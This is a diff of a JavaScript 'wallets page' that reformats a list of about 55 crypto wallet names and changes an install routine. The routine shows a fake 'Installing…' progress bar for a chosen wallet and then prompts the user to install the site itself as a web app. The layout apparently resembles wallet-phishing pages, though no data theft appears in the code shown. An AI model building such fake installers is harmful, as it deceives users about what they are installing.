@@ -2,15 +2,61 @@ console.log("Wallets page loaded!");
 
 // Final clean wallet list (no duplicates)
 const wallets = [
-  "Meta Mask", "Poloniex", "Trust", "Solflare", "WalletConnect", "Terra",
-  "Bitpay", "Maiar", "MyKey", "Atwallet", "Authereum", "Bitfrost", "Coinbase1",
-  "Coinomi", "Dcent", "Easypocket", "Ledger", "Coolwallet", "Cybavowallet",
-  "Coin98", "Harmony", "PeakDefi", "Gridplus", "VIA", "Imtoken", "Infinito",
-  "Infinity", "Kadachain", "Keplr", "Midas1", "Marixwallet", "Midas2", "Nash",
-  "Onto", "Ownbit", "Pillar", "Rainbow", "Safepal", "Sollet", "Spark",
-  "Spatium", "Tokenary", "Tokenpocket", "Tomo", "Torus", "Coinbase2", "XDC",
-  "Walletio", "Walleth", "Zelcore", "Phantom", "Exodus", "Binance", "Bitget",
-  "Other Wallets"
+  "Meta Mask",
+  "Poloniex",
+  "Trust",
+  "Solflare",
+  "WalletConnect",
+  "Terra",
+  "Bitpay",
+  "Maiar",
+  "MyKey",
+  "Atwallet",
+  "Authereum",
+  "Bitfrost",
+  "Coinbase1",
+  "Coinomi",
+  "Dcent",
+  "Easypocket",
+  "Ledger",
+  "Coolwallet",
+  "Cybavowallet",
+  "Coin98",
+  "Harmony",
+  "PeakDefi",
+  "Gridplus",
+  "VIA",
+  "Imtoken",
+  "Infinito",
+  "Infinity",
+  "Kadachain",
+  "Keplr",
+  "Midas1",
+  "Marixwallet",
+  "Midas2",
+  "Nash",
+  "Onto",
+  "Ownbit",
+  "Pillar",
+  "Rainbow",
+  "Safepal",
+  "Sollet",
+  "Spark",
+  "Spatium",
+  "Tokenary",
+  "Tokenpocket",
+  "Tomo",
+  "Torus",
+  "Coinbase2",
+  "XDC",
+  "Walletio",
+  "Walleth",
+  "Zelcore",
+  "Phantom",
+  "Exodus",
+  "Binance",
+  "Bitget",
+  "Other Wallets",
 ];
 
 const container = document.getElementById("walletContainer");
@@ -18,7 +64,8 @@ const container = document.getElementById("walletContainer");
 // Generate cards
 wallets.forEach((name) => {
   let imageName =
-    name.toLowerCase()
+    name
+      .toLowerCase()
       .replace(/\s+/g, "")
       .replace(/'/g, "")
       .replace(/\./g, "")
@@ -95,12 +142,13 @@ function openWallet(walletName) {
 
 function shareWallet(walletName) {
   if (navigator.share) {
-    navigator.share({
-      title: "Wallet",
-      text: `Check this wallet: ${walletName}`,
-      url: window.location.href
-    })
-    .catch((err) => console.log("Share cancelled", err));
+    navigator
+      .share({
+        title: "Wallet",
+        text: `Check this wallet: ${walletName}`,
+        url: window.location.href,
+      })
+      .catch((err) => console.log("Share cancelled", err));
   } else {
     alert("Sharing is not supported on this device.");
   }
@@ -123,7 +171,6 @@ function closePopup() {
 
 // MOBILE ONLY INSTALL
 function installWallet(walletName) {
-
   if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
     alert("This feature only works on mobile devices.");
     return;
@@ -137,7 +184,9 @@ function installWallet(walletName) {
 
   let interval = setInterval(() => {
     progress++;
-    document.getElementById("progressText").innerText = `Installing… ${progress}%`;
+    document.getElementById(
+      "progressText"
+    ).innerText = `Installing… ${progress}%`;
     document.getElementById("progressFill").style.width = progress + "%";
 
     if (progress >= 100) {
@@ -146,9 +195,17 @@ function installWallet(walletName) {
       document.getElementById("progressText").innerText = "Done!";
       document.getElementById("progressFill").style.width = "100%";
 
-      setTimeout(() => {
+      setTimeout(async () => {
         closePopup();
-        openWallet(walletName);
+
+        // Trigger PWA Install popup here
+        if (window.deferredPrompt) {
+          window.deferredPrompt.prompt();
+          await window.deferredPrompt.userChoice;
+          window.deferredPrompt = null;
+        } else {
+          alert("Install prompt not ready.");
+        }
       }, 700);
     }
   }, 40);
